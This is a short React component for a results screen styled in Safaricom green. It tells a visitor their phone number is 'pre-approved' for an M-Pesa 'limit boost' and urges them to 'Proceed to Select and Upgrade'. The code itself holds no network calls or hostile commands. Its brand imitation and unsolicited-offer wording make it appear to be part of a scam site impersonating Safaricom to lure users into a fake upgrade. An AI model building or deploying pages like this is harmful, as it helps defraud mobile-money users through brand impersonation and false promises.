import React from "react";
import { SAFARICOM_GREEN } from '../utils/constants';

export default function ResultStep({ phoneNumber, onProceed }) {
  return (
    <div
      id="result-step"
      className="bg-white p-10 rounded-[2rem] shadow-xl text-center mb-10 border-2 border-safaricom"
      style={{ borderColor: SAFARICOM_GREEN }}
    >
      <i
        className="fas fa-check-circle text-safaricom text-6xl mb-4"
        style={{ color: SAFARICOM_GREEN }}
      />
      <h2 className="text-2xl font-extrabold mb-2">
        Congratulations! You are Pre-approved for a new limit
      </h2>
      <p className="text-slate-600 mb-6">
        Your number <span
          id="displayNum"
          className="font-bold text-safaricom"
          style={{ color: SAFARICOM_GREEN }}
        >
          {phoneNumber}
        </span> is eligible for a limit boost.
        <span className="font-bold">Keep using M-Pesa to grow your limit even higher</span>.
      </p>
      <button
        onClick={onProceed}
        className="w-full bg-slate-900 text-white font-bold py-5 rounded-2xl shadow-xl cursor-pointer hover:bg-slate-800 transition-all"
      >
        Proceed to Select and Upgrade
      </button>
    </div>
  );
}